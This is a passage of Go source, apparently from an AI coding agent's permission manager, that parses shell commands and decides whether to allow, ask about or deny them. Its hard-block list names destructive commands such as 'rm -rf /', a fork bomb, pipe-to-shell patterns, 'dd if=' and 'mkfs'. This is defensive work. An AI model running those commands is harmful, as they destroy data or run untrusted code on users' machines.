		iWords := len(strings.Fields(keys[i]))
		jWords := len(strings.Fields(keys[j]))
		if iWords != jWords {
			return iWords > jWords
		}
		return keys[i] < keys[j]
	})
	for _, prefix := range keys {
		prefixWords := strings.Fields(prefix)
		if len(prefixWords) == 0 || len(prefixWords) > len(cmdWords) {
			continue
		}
		matched := true
		for i := range prefixWords {
			if cmdWords[i] != prefixWords[i] {
				matched = false
				break
			}
		}
		if matched {
			return prefix, true
		}
	}
	return "", false
}

func (pm *PermissionManager) BashBannedPrefixes() []string {
	result := make([]string, 0)
	for prefix, level := range pm.bashPrefixes {
		if strings.HasPrefix(prefix, bashInRootPersistPrefix) {
			continue
		}
		if level == PermissionDeny {
			result = append(result, prefix)
		}
	}
	sort.Strings(result)
	return result
}

func (pm *PermissionManager) ExportConfig() config.PermissionConfig {
	tools := make(map[string]string)
	for k, v := range pm.Rules() {
		tools[k] = string(v)
	}
	prefixes := make(map[string]string)
	for k, v := range pm.BashPrefixRules() {
		prefixes[k] = string(v)
	}
	autoAllow := make([]string, 0, len(pm.bashAutoAllow))
	for k, v := range pm.bashAutoAllow {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		if v {
			autoAllow = append(autoAllow, k)
		}
	}
	modes := make(map[string]string, len(pm.bashPrefixModes))
	for k, v := range pm.bashPrefixModes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		modes[k] = v
	}
	var auto *config.AutoPermissionConfig
	if pm.AutoPermissionEnabled() {
		auto = &config.AutoPermissionConfig{Enabled: true}
	}
	return config.PermissionConfig{
		Mode:  string(pm.Mode()),
		Tools: tools,
		Bash: config.BashPermissionConfig{
			Prefixes:          prefixes,
			AutoAllowPrefixes: autoAllow,
			PrefixModes:       modes,
		},
		Auto: auto,
	}
}

func validPermissionLevel(level PermissionLevel) bool {
	return level == PermissionAllow || level == PermissionDeny || level == PermissionAsk
}

func isReadOnlyTool(name string) bool {
	switch name {
	case "read", "glob", "grep", "list", "lsp", "lsp_diagnostics", "webfetch", "websearch", "skill", "load_skill", "question", "todoread", "todowrite":
		return true
	default:
		return false
	}
}

func bashCommand(args json.RawMessage) string {
	var params struct {
		Command string `json:"command"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return ""
	}
	return strings.TrimSpace(params.Command)
}

func bashPrefix(command string) (string, bool) {
	if command == "" || shellCompound(command) {
		return "", false
	}
	fields := splitShellFields(command)
	if len(fields) == 0 {
		return "", false
	}
	if fields[0] == "sudo" || strings.Contains(fields[0], "=") {
		return "", false
	}
	return fields[0], true
}

func shellCompound(command string) bool {
	for _, token := range []string{"&&", "||", ";", "|", "`", "$(", ">", "<"} {
		if strings.Contains(command, token) {
			return true
		}
	}
	return false
}

func splitShellFields(command string) []string {
	var fields []string
	var b strings.Builder
	inSingle := false
	inDouble := false
	escaped := false
	for _, r := range command {
		if escaped {
			b.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' {
			escaped = true
			continue
		}
		switch r {
		case '\'':
			if !inDouble {
				inSingle = !inSingle
				continue
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
				continue
			}
		}
		if unicode.IsSpace(r) && !inSingle && !inDouble {
			if b.Len() > 0 {
				fields = append(fields, b.String())
				b.Reset()
			}
			continue
		}
		b.WriteRune(r)
	}
	if b.Len() > 0 {
		fields = append(fields, b.String())
	}
	return fields
}

func bashInRootKey(prefix, workDir string) string {
	cleanWorkDir := filepath.Clean(workDir)
	return bashInRootPersistPrefix + prefix + ":" + cleanWorkDir
}

func canAutoAllowWithMode(pm *PermissionManager, command, prefix string) bool {
	if !canAutoAllowInRoot(pm, command, prefix) {
		return false
	}
	mode := pm.bashPrefixModes[prefix]
	switch mode {
	case bashPrefixModeNever:
		return false
	case bashPrefixModeMutating:
		return true
	default:
		pm.bashPrefixes[bashInRootKey(prefix, pm.workDir)] = PermissionAllow
		return true
	}
}

func canAutoAllowInRoot(pm *PermissionManager, command, prefix string) bool {
	if pm == nil || pm.workDir == "" {
		return false
	}
	if !pm.bashAutoAllow[prefix] {
		return false
	}
	if shellCompound(command) {
		return false
	}
	fields := splitShellFields(command)
	if len(fields) == 0 || fields[0] != prefix {
		return false
	}
	// find/fd: reject if any field is an unsafe flag (executes subprocesses
	// or deletes files). These flags would let an in-root path argument
	// trigger arbitrary actions, defeating the workdir scope.
	if prefix == "find" {
		for _, f := range fields[1:] {
			if findUnsafeFlags[f] {
				return false
			}
		}
	}
	if prefix == "fd" {
		for _, f := range fields[1:] {
			if fdUnsafeFlags[f] {
				return false
			}
		}
	}
	paths := extractBashCommandPaths(prefix, fields)
	if prefix == "cd" && len(paths) == 0 {
		home := os.Getenv("HOME")
		if home != "" {
			paths = append(paths, home)
		}
	}
	// Zero paths means the command operates on stdin or the current directory
	// only (e.g. `grep "foo"`, `find`, `ls`). That's still inside the workdir
	// by definition, so allow.
	for _, p := range paths {
		resolved := resolvePath(p, pm.workDir)
		if !isWithinAllowedScope(pm, resolved) {
			return false
		}
	}
	return true
}

// firstOutOfScopePath returns the first path argument of an auto-allow-eligible
// command that resolves outside the workdir (and isn't a temp dir), or "" when
// every path is in-scope. It mirrors the scope loop in canAutoAllowInRoot so the
// permission prompt can surface the exact out-of-workspace root to persist to
// extra_allowed_paths instead of a useless bash-prefix rule.
func firstOutOfScopePath(pm *PermissionManager, command, prefix string) string {
	if pm == nil || pm.workDir == "" {
		return ""
	}
	// Commands with shell substitutions ($(...) or backticks) cannot be
	// statically evaluated to a concrete path — the resolved path depends on
	// runtime expansion.  Return "" so the caller falls back to a generic bash
	// ask rather than surfacing a path fragment that verifyAutoGrant would
	// falsely reject as out-of-scope.
	if strings.Contains(command, "$(") || strings.Contains(command, "`") {
		return ""
	}
	if shellCompound(command) {
		return ""
	}
	fields := splitShellFields(command)
	if len(fields) == 0 || fields[0] != prefix {
		return ""
	}
	paths := extractBashCommandPaths(prefix, fields)
	if prefix == "cd" && len(paths) == 0 {
		if home := os.Getenv("HOME"); home != "" {
			paths = append(paths, home)
		}
	}
	for _, p := range paths {
		resolved := resolvePath(p, pm.workDir)
		if !isWithinAllowedScope(pm, resolved) {
			return resolved
		}
	}
	return ""
}

func extractBashCommandPaths(prefix string, fields []string) []string {
	var paths []string
	sedScriptConsumed := false
	// grep/rg: pattern is the first positional arg (skip it); -e/-f consume the
	// pattern inline, so mark it consumed when we see those flags.
	grepPatternConsumed := false
	for i := 1; i < len(fields); i++ {
		arg := fields[i]
		if arg == "--" {
			for j := i + 1; j < len(fields); j++ {
				if strings.TrimSpace(fields[j]) != "" {
					paths = append(paths, fields[j])
				}
			}
			break
		}
		if strings.HasPrefix(arg, "-") {
			switch prefix {
			case "awk":
				if arg == "-f" {
					i++
				}
			case "sed":
				if arg == "-e" || arg == "-f" {
					if arg == "-e" {
						sedScriptConsumed = true
					}
					i++
				}
			case "grep", "rg":
				// -e PAT / -f FILE: pattern is supplied inline, so the first
				// positional arg (if any) is a path, not a pattern.
				if arg == "-e" || arg == "-f" || arg == "--file" {
					grepPatternConsumed = true
					i++
				}
			}
			continue
		}
		if prefix == "awk" && i == 1 {
			continue
		}
		// cd's positional args are always paths, even bare names like `cd web`
		// that isLikelyPathArg would reject — otherwise the zero-paths HOME
		// fallback misclassifies them as `cd` to an out-of-scope $HOME.
		if prefix == "cd" {
			paths = append(paths, arg)
			continue
		}
		if prefix == "sed" && !sedScriptConsumed {
			sedScriptConsumed = true
			continue
		}
		// grep/rg: first positional arg is the search pattern, not a path.
		if (prefix == "grep" || prefix == "rg") && !grepPatternConsumed {
			grepPatternConsumed = true
			continue
		}
		if isLikelyPathArg(arg) {
			paths = append(paths, arg)
		}
	}
	return paths
}

// isLikelyPathArg returns true if arg looks like a filesystem path. Bare
// identifiers (e.g. literal patterns passed to grep, awk's variable names)
// return false so they don't get treated as out-of-workdir paths and
// inadvertently block the auto-allow.
func isLikelyPathArg(arg string) bool {
	if arg == "" {
		return false
	}
	// Glob metacharacters.
	if strings.ContainsAny(arg, "*?[") {
		return true
	}
	// Absolute or explicitly-rooted relative paths.
	if strings.HasPrefix(arg, "/") || strings.HasPrefix(arg, "./") ||
		strings.HasPrefix(arg, "../") || strings.HasPrefix(arg, "~/") ||
		arg == "." || arg == ".." || arg == "~" {
		return true
	}
	// Contains a path separator → almost certainly a path.
	if strings.Contains(arg, string(filepath.Separator)) {
		return true
	}
	// Looks like a filename (has an extension dot in the middle).
	if dot := strings.Index(arg, "."); dot > 0 && dot < len(arg)-1 {
		return true
	}
	return false
}

// dangerousRmReason reports why a `rm` invocation with a recursive and/or
// force flag should always require human approval, regardless of YOLO mode
// or any persisted "rm" bash-prefix rule. isHardBlockedCommand only catches
// the exact literal "rm -rf /", so without this check YOLO mode gave
// `rm -rf ../`, `rm -rf ~`, or `rm -rf /absolute/path` an unconditional
// ALLOW with no scope check at all. Returns "" when the command isn't a
// scope-violating rm.
func dangerousRmReason(pm *PermissionManager, fields []string) string {
	if len(fields) == 0 || filepath.Base(fields[0]) != "rm" {
		return ""
	}
	hasForce, hasRecursive := false, false
	var targets []string
	for i := 1; i < len(fields); i++ {
		arg := fields[i]
		if arg == "--" {
			targets = append(targets, fields[i+1:]...)
			break
		}
		if strings.HasPrefix(arg, "--") {
			switch arg {
			case "--force":
				hasForce = true
			case "--recursive":
				hasRecursive = true
			}
			continue
		}
		if strings.HasPrefix(arg, "-") && len(arg) > 1 {
			for _, c := range arg[1:] {
				if c == 'f' {
					hasForce = true
				} else if c == 'r' || c == 'R' {
					hasRecursive = true
				}
			}
			continue
		}
		targets = append(targets, arg)
	}
	if !hasForce && !hasRecursive {
		return ""
	}
	if pm == nil || pm.workDir == "" {
		return ""
	}
	for _, t := range targets {
		resolved := resolvePath(t, pm.workDir)
		if !isWithinAllowedScope(pm, resolved) {
			return fmt.Sprintf("rm target %q resolves outside allowed scope", t)
		}
	}
	return ""
}

func isHardBlockedCommand(command string) bool {
	compact := strings.Join(splitShellFields(command), " ")
	if compact == "rm -rf /" || compact == "rm -fr /" || strings.Contains(command, ":(){ :|:& };:") {
		return true
	}
	// Hard-block destructive and exfiltration patterns
	blockedPatterns := []string{
		"| bash", "| sh", "| python", "| perl", // pipe to shell
		"dd if=", "mkfs", // disk/partition write
		"; sudo", "&& sudo", "| sudo", // privilege escalation chains
	}
	for _, p := range blockedPatterns {
		if strings.Contains(command, p) {
			return true
		}
	}
	return false
}

func IsAllowedPlanWritePath(path string) bool {
	clean := filepath.ToSlash(filepath.Clean(path))
	base := filepath.Base(clean)
	if base == "PLAN.md" || strings.HasSuffix(base, ".plan.md") {
		return true
	}
	if strings.HasPrefix(clean, "plans/") || strings.Contains(clean, "/plans/") {
		return true
	}
	if strings.HasPrefix(clean, "docs/plans/") || strings.Contains(clean, "/docs/plans/") {
		return true
	}
	return false
}

func IsAllowedReviewWritePath(path string) bool {
	clean := filepath.ToSlash(filepath.Clean(path))
	base := filepath.Base(clean)
	if base == "REVIEW.md" || strings.HasSuffix(base, ".review.md") {
		return true
	}
	if strings.HasPrefix(clean, "reviews/") || strings.Contains(clean, "/reviews/") {
		return true
	}
	return false
}

// Shell parsing and validation structures and functions

type shellTokenType int

const (
	tokWord       shellTokenType = iota
	tokOp                        // &&, ||, ;, &, |
	tokRedir                     // >, >>, <, 2>, &>, etc.
	tokSubst                     // $(...) or `...`
	tokLeftParen                 // (
	tokRightParen                // )
)

type shellToken struct {
	typ   shellTokenType
	value string
}

type parsedShellCommand struct {
	envVars           []string // "KEY=VAL"
	cmdWords          []string // command and its arguments (e.g. ["go", "test", "./..."])
	redirections      []string // target paths
	stdinRedirections []string // target paths feeding stdin (e.g. "< file", "0< file")
}

func parseShellCommandLine(commandLine string) ([]parsedShellCommand, error) {
	tokens, err := tokenizeShell(commandLine)
	if err != nil {
		return nil, err
	}

	var commands []parsedShellCommand
	var currentTokens []shellToken

	emitCommand := func() {
		if len(currentTokens) > 0 {
			cmd := parseSingleCommandTokens(currentTokens)
			if cmd != nil {
				commands = append(commands, *cmd)
			}
			currentTokens = nil
		}
	}

	// Shell reserved words that introduce a new command body without an
	// intervening operator token (e.g. "do rm -rf /" inside a for/while
	// loop, "then rm -rf /" inside an if, or the condition command after
	// if/elif/while/until). Without splitting here, the banned command
	// becomes a trailing word of the keyword's own fragment instead of a
	// fragment's leading word, so matchBashPrefixRule never sees it and
	// the deny short-circuit is skipped. Block terminators (fi/done/esac)
	// and leading "!" negation are dropped the same way so they never
	// surface as bogus command prefixes that trigger permission asks.
	bodyIntroKeywords := map[string]bool{
		"do": true, "then": true, "else": true, "elif": true,
		"if": true, "while": true, "until": true,
		"fi": true, "done": true, "esac": true,
		"!": true,
	}

	for _, tok := range tokens {
		if tok.typ == tokOp {
			emitCommand()
		} else if tok.typ == tokLeftParen || tok.typ == tokRightParen {
			emitCommand()
		} else if tok.typ == tokWord && len(currentTokens) == 0 && bodyIntroKeywords[tok.value] {
			// Bare keyword at the start of a fragment: drop it and let the
			// following words form their own command fragment.
			continue
		} else if tok.typ == tokSubst {
			subCmds, err := parseShellCommandLine(tok.value)
			if err == nil {
				commands = append(commands, subCmds...)
			}
			currentTokens = append(currentTokens, tok)
		} else {
			currentTokens = append(currentTokens, tok)
		}
	}
	emitCommand()

	return commands, nil
}

// absorbFdDup extends a just-emitted redirect operator (e.g. ">", "2>") to
// include a trailing fd-duplication target like "&1", "&2" or "&-" (as in
// "2>&1"). i points at the last consumed rune of the operator; it returns the
// new index positioned at the last absorbed rune (so the caller's loop i++
// advances past it). When no fd-dup follows, i and op are unchanged.
func absorbFdDup(runes []rune, n, i int, op *string) int {
	if i+1 >= n || runes[i+1] != '&' {
		return i
	}
	j := i + 2
	for j < n && (unicode.IsDigit(runes[j]) || runes[j] == '-') {
		j++
	}
	if j == i+2 {
		// Bare "&" with no fd target — leave it for the '&' operator handler.
		return i
	}
	*op += string(runes[i+1 : j])
	return j - 1
}

func isInputRedirectionOp(op string) bool {
	if op == "<" {
		return true
	}
	return strings.HasSuffix(op, "<") && !strings.HasPrefix(op, "<<")
}

func tokenizeShell(input string) ([]shellToken, error) {
	var tokens []shellToken
	var current strings.Builder

	runes := []rune(input)
	n := len(runes)

	inSingle := false
	inDouble := false
	escaped := false

	emitWord := func() {
		if current.Len() > 0 {
			tokens = append(tokens, shellToken{typ: tokWord, value: current.String()})
			current.Reset()
		}
	}

	for i := 0; i < n; i++ {
		r := runes[i]

		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}

		if r == '\\' && !inSingle {
			if inDouble {
				if i+1 < n && (runes[i+1] == '"' || runes[i+1] == '\\' || runes[i+1] == '$' || runes[i+1] == '`') {
					escaped = true
					continue
				} else {
					current.WriteRune(r)
					continue
				}
			} else {
				escaped = true
				continue
			}
		}

		if inSingle {
			if r == '\'' {
				inSingle = false
			} else {
				current.WriteRune(r)
			}
			continue
		}

		if inDouble {
			if r == '$' && i+1 < n && runes[i+1] == '(' {
				emitWord()
				sub, endIdx, err := parseParenthesis(runes, i+1)
				if err != nil {
					return nil, err
				}
				tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
				i = endIdx
				continue
			}
			if r == '`' {
				emitWord()
				sub, endIdx, err := parseBackticks(runes, i)
				if err != nil {
					return nil, err
				}
				tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
				i = endIdx
				continue
			}
			if r == '"' {
				inDouble = false
			} else {
				current.WriteRune(r)
			}
			continue
		}

		switch r {
		case '\'':
			inSingle = true
		case '"':
			inDouble = true
		case '`':
			emitWord()
			sub, endIdx, err := parseBackticks(runes, i)
			if err != nil {
				return nil, err
			}
			tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
			i = endIdx
		case '$':
			if i+1 < n && runes[i+1] == '(' {
				emitWord()
				sub, endIdx, err := parseParenthesis(runes, i+1)
				if err != nil {
					return nil, err
				}
				tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
				i = endIdx
			} else {
				current.WriteRune(r)
			}
		case '&':
			emitWord()
			if i+1 < n && runes[i+1] == '>' {
				// &> / &>> : redirect both stdout and stderr to the next word.
				if i+2 < n && runes[i+2] == '>' {
					tokens = append(tokens, shellToken{typ: tokRedir, value: "&>>"})
					i += 2
				} else {
					tokens = append(tokens, shellToken{typ: tokRedir, value: "&>"})
					i++
				}
			} else if i+1 < n && runes[i+1] == '&' {
				tokens = append(tokens, shellToken{typ: tokOp, value: "&&"})
				i++
			} else {
				tokens = append(tokens, shellToken{typ: tokOp, value: "&"})
			}
		case '|':
			emitWord()
			if i+1 < n && runes[i+1] == '|' {
				tokens = append(tokens, shellToken{typ: tokOp, value: "||"})
				i++
			} else {
				tokens = append(tokens, shellToken{typ: tokOp, value: "|"})
			}
		case ';':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokOp, value: ";"})
		case '\n', '\r':
			// An unquoted newline terminates a command, exactly like ';'. This
			// makes each line of a multi-line script evaluate as its own command
			// (so an allowed `sed` line isn't merged with the next), and lets the
			// '#' comment-skip above drop whole comment lines. Quoted newlines
			// (inside "...", the body of `python3 -c "..."`, etc.) never reach
			// here — they're consumed by the inDouble/inSingle branches.
			emitWord()
			tokens = append(tokens, shellToken{typ: tokOp, value: ";"})
		case '(':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokLeftParen, value: "("})
		case ')':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokRightParen, value: ")"})
		case '>':
			emitWord()
			op := ">"
			if i+1 < n && runes[i+1] == '>' {
				op = ">>"
				i++
			}
			i = absorbFdDup(runes, n, i, &op)
			tokens = append(tokens, shellToken{typ: tokRedir, value: op})
		case '<':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokRedir, value: "<"})
		case '#':
			// An unquoted '#' at a word boundary begins a comment that runs to
			// end-of-line (POSIX). Skip it so the comment isn't tokenized as a
			// command word named "#" (which surfaced as a bogus `bash prefix "#"`
			// ASK that escalated otherwise-allowed multi-line scripts). A '#' in
			// the middle of a word (e.g. a URL fragment "host/#frag") stays
			// literal.
			if current.Len() == 0 {
				for i+1 < n && runes[i+1] != '\n' {
					i++
				}
			} else {
				current.WriteRune(r)
			}
		case '1', '2':
			if i+1 < n && runes[i+1] == '>' {
				emitWord()
				op := string(r) + ">"
				i++ // consume the '>'
				if i+1 < n && runes[i+1] == '>' {
					op = string(r) + ">>"
					i++
				}
				// Absorb an fd-duplication target so "2>&1" is one redirect
				// token, not a "2>" redirect plus a "&" operator plus a "1"
				// command word (which surfaced as a bogus `bash prefix "1"`).
				i = absorbFdDup(runes, n, i, &op)
				tokens = append(tokens, shellToken{typ: tokRedir, value: op})
			} else {
				current.WriteRune(r)
			}
		default:
			if unicode.IsSpace(r) {
				emitWord()
			} else {
				current.WriteRune(r)
			}
		}
	}
	emitWord()
	return tokens, nil
}

func parseParenthesis(runes []rune, start int) (string, int, error) {
	depth := 1
	inSingle := false
	inDouble := false
	escaped := false
	var content strings.Builder

	n := len(runes)
	for i := start + 1; i < n; i++ {
		r := runes[i]
		if escaped {
			content.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' && !inSingle {
			content.WriteRune(r)
			escaped = true
			continue
		}
		if inSingle {
			if r == '\'' {
				inSingle = false
			}
			content.WriteRune(r)
			continue
		}
		if inDouble {
			if r == '"' {
				inDouble = false
			}
			content.WriteRune(r)
			continue
		}

		switch r {
		case '\'':
			inSingle = true
			content.WriteRune(r)
		case '"':
			inDouble = true
			content.WriteRune(r)
		case '(':
			depth++
			content.WriteRune(r)
		case ')':
			depth--
			if depth == 0 {
				return content.String(), i, nil
			}
			content.WriteRune(r)
		default:
			content.WriteRune(r)
		}
	}
	return "", 0, fmt.Errorf("unbalanced parenthesis in command substitution")
}

func parseBackticks(runes []rune, start int) (string, int, error) {
	inSingle := false
	inDouble := false
	escaped := false
	var content strings.Builder

	n := len(runes)
	for i := start + 1; i < n; i++ {
		r := runes[i]
		if escaped {
			content.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' && !inSingle {
			content.WriteRune(r)
			escaped = true
			continue
		}
		if inSingle {
			if r == '\'' {
				inSingle = false
			}
			content.WriteRune(r)
			continue
		}
		if inDouble {
			if r == '"' {
				inDouble = false
			}
			content.WriteRune(r)
			continue
		}

		switch r {
		case '\'':
			inSingle = true
			content.WriteRune(r)
		case '"':
			inDouble = true
			content.WriteRune(r)
		case '`':
			return content.String(), i, nil
		default:
			content.WriteRune(r)
		}
	}
	return "", 0, fmt.Errorf("unbalanced backticks in command substitution")
}

func parseSingleCommandTokens(tokens []shellToken) *parsedShellCommand {
	var cmd parsedShellCommand
	var remaining []shellToken

	for i := 0; i < len(tokens); i++ {
		tok := tokens[i]
		if tok.typ == tokRedir {
			if i+1 < len(tokens) && tokens[i+1].typ == tokWord {
				target := tokens[i+1].value
				cmd.redirections = append(cmd.redirections, target)
				if isInputRedirectionOp(tok.value) {
					cmd.stdinRedirections = append(cmd.stdinRedirections, target)
				}
				i++
			}
		} else {
			remaining = append(remaining, tok)
		}
	}

	if len(remaining) == 0 {
		return nil
	}

	idx := 0
	for idx < len(remaining) {
		tok := remaining[idx]
		if tok.typ == tokWord && strings.Contains(tok.value, "=") {
			cmd.envVars = append(cmd.envVars, tok.value)
			idx++
		} else {
			break
		}
	}

	for idx < len(remaining) {
		tok := remaining[idx]
		if tok.typ == tokWord {
			cmd.cmdWords = append(cmd.cmdWords, tok.value)
		} else if tok.typ == tokSubst {
			cmd.cmdWords = append(cmd.cmdWords, "$("+tok.value+")")
		}
		idx++
	}

	if len(cmd.cmdWords) == 0 && len(cmd.envVars) == 0 && len(cmd.redirections) == 0 {
		return nil
	}

	return &cmd
}

func rebuildCommandLine(fields []string) string {
	var parts []string
	for _, f := range fields {
		if f == "" {
			parts = append(parts, `""`)
			continue
		}
		needsQuote := false
		for _, r := range f {
			if unicode.IsSpace(r) || strings.ContainsRune(`'"&|;><()*?[$`, r) {
				needsQuote = true
				break
			}
		}
		if needsQuote {
			escaped := strings.ReplaceAll(f, `"`, `\"`)
			parts = append(parts, `"`+escaped+`"`)
		} else {
			parts = append(parts, f)
		}
	}
	return strings.Join(parts, " ")
}

func resolvePath(path string, workDir string) string {
	if strings.HasPrefix(path, "~") {
		home := os.Getenv("HOME")
		if home != "" {
			if path == "~" {
				return home
			}
			if strings.HasPrefix(path, "~/") {
				return filepath.Join(home, path[2:])
			}
		}
	}
	if !filepath.IsAbs(path) {
		return filepath.Join(workDir, path)
	}
	return path
}

func (pm *PermissionManager) decideSingleCommand(args json.RawMessage, cmd parsedShellCommand) PermissionDecision {
	// Check env variables for path values
	for _, env := range cmd.envVars {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) == 2 {
			val := parts[1]
			if isLikelyPathArg(val) {
				resolved := resolvePath(val, pm.workDir)
				if !isWithinAllowedScope(pm, resolved) {
					pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (env out-of-scope): env=%s path=%s", env, resolved))
					return PermissionDecision{
						Level:   PermissionAsk,
						Request: envVarPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), resolved, false),
					}
				}
				if isSensitivePath(resolved) {
					pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (env sensitive): env=%s path=%s", env, resolved))
					return PermissionDecision{
						Level:   PermissionAsk,
						Request: envVarPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), resolved, true),
					}
				}
			}
		}
	}

	// Check redirections
	for _, path := range cmd.redirections {
		if isAllowedDevicePath(path) {
			continue
		}
		resolved := resolvePath(path, pm.workDir)
		if !isWithinAllowedScope(pm, resolved) {
			pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (redirect out-of-scope): path=%s", resolved))
			return PermissionDecision{
				Level:   PermissionAsk,
				Request: redirectionPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), resolved, false),
			}
		}
		if isSensitivePath(resolved) {
			pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (redirect sensitive): path=%s", resolved))
			return PermissionDecision{
				Level:   PermissionAsk,
				Request: redirectionPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), resolved, true),
			}
		}
	}

	if len(cmd.cmdWords) == 0 {
		return PermissionDecision{Level: PermissionAllow}
	}

	command := rebuildCommandLine(cmd.cmdWords)
	if isHardBlockedCommand(command) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand DENY (hard-blocked): command=%q", command))
		return PermissionDecision{Level: PermissionDeny, HardDeny: true}
	}

	prefix := cmd.cmdWords[0]

	// rulePrefix is the granularity at which an "always allow" rule is offered
	// and matched. For git it is the two-word subcommand prefix (e.g. "git push")
	// so a rule can be persisted without blanket-allowing every git subcommand —
	// a blanket "git" allow is deliberately rejected by SetBashPrefixRule, which
	// would otherwise leave the permission dialog looping forever.
	// Transparent to `git -c` / `--no-pager` wrappers: the prefix is the
	// underlying subcommand, not the wrapper flag.
	rulePrefix := prefix
	if prefix == "git" {
		if idx := gitSubcommandIndex(cmd.cmdWords); idx != -1 {
			rulePrefix = "git " + cmd.cmdWords[idx]
		} else if len(cmd.cmdWords) >= 2 {
			rulePrefix = prefix + " " + cmd.cmdWords[1]
		}
	}

	// Explicit user bans win over the hardcoded "harmful" ask-list below — a
	// user who has run "/ban add git stash" wants it silently denied, not
	// asked about every time. Checked first so the harmful-command ask can't
	// shadow an explicit deny rule.
	if deniedPrefix, ok := pm.matchBashPrefixRule(cmd.cmdWords, PermissionDeny); ok {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand DENY (banned prefix rule): prefix=%s", deniedPrefix))
		return PermissionDecision{Level: PermissionDeny, HardDeny: true}
	}

	// Claude Code settings: deny takes precedence over everything (mirrors
	// Claude's deny > ask > allow evaluation order). A matching deny in
	// .claude/settings.json or .claude/settings.local.json is a hard block
	// that no allow rule or auto-allow can bypass.
	if pm.claudeIsDenied(command) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand DENY (claude deny): command=%q", command))
		return PermissionDecision{Level: PermissionDeny, HardDeny: true}
	}

	// Harmful operations (git revert/stash/reset/clean/checkout/restore/switch,
	// git push/pull --force, exfiltration) always require explicit human
	// approval and must never auto-allow — even when a broader prefix rule or a
	// tool-level "bash" allow would otherwise permit them (e.g. a persisted
	// "git push" rule must not auto-approve "git push --force").
	if IsHarmfulBashCommand(command) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (harmful): command=%q", command))
		return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
	}

	// Claude ask/allow are evaluated after harmful (so force-push stays ask)
	// but before ocode's own auto-allow lists, so an explicit project
	// permission like "Bash(git push *)" is honoured without prompting.
	if pm.claudeIsAsk(command) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (claude ask): command=%q", command))
		return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
	}
	if pm.claudeIsAllowed(command) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (claude allow): command=%q", command))
		return PermissionDecision{Level: PermissionAllow}
	}

	// Loopback netcat (127.0.0.0/8, ::1, localhost) stays on-host and cannot
	// exfiltrate data off-machine, so it is auto-allowed without prompting —
	// this is the one nc variant we treat as safe (it is never "harmful").
	if isLoopbackNetcat(command) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (loopback nc): command=%q", command))
		return PermissionDecision{Level: PermissionAllow}
	}

	// Loopback curl, wget, and httpie (targeting 127.0.0.0/8, ::1, localhost)
	// stay on-host and cannot exfiltrate data off-machine, so they are
	// auto-allowed without prompting — same rationale as loopback nc.
	if isLoopbackNetworkCommand(command) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (loopback network): command=%q", command))
		return PermissionDecision{Level: PermissionAllow}
	}

	// 1. Temp directory operations are always allowed (cross-platform)
	// Check if all path arguments in the command reference temp directories.
	if allArgsAreTempDirs(cmd.cmdWords) {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (all args are temp dirs): command=%q", command))
		return PermissionDecision{Level: PermissionAllow}
	}

	// 2. Persisted in-root rule
	if level, exists := pm.bashPrefixes[bashInRootKey(prefix, pm.workDir)]; exists {
		if level == PermissionAllow && canAutoAllowInRoot(pm, command, prefix) {
			pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (in-root): prefix=%s", prefix))
			return PermissionDecision{Level: PermissionAllow}
		}
	}

	// 3. Explicit prefix rule. A broad single-word deny (e.g. "git" => deny)
	// governs every subcommand and must win over any granular allow.
	if level, exists := pm.bashPrefixes[prefix]; exists && level == PermissionDeny {
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand DENY (broad prefix rule): prefix=%s", prefix))
		return PermissionDecision{Level: PermissionDeny, HardDeny: true}
	}
	// Then the granular rulePrefix (e.g. "git push"), which carries always-allow.
	if level, exists := pm.bashPrefixes[rulePrefix]; exists {
		if level == PermissionAsk {
			pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (prefix rule): prefix=%s", rulePrefix))
			return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
		}
		pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand %s (prefix rule): prefix=%s", level, rulePrefix))
		return PermissionDecision{Level: level}
	}
	// Finally a broad single-word ask rule (only reached when rulePrefix differs,
	// i.e. git; a broad "git" allow cannot persist so only Ask remains here).
	if rulePrefix != prefix {
		if level, exists := pm.bashPrefixes[prefix]; exists && level == PermissionAsk {
			pm.emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (broad prefix rule): prefix=%s", prefix))
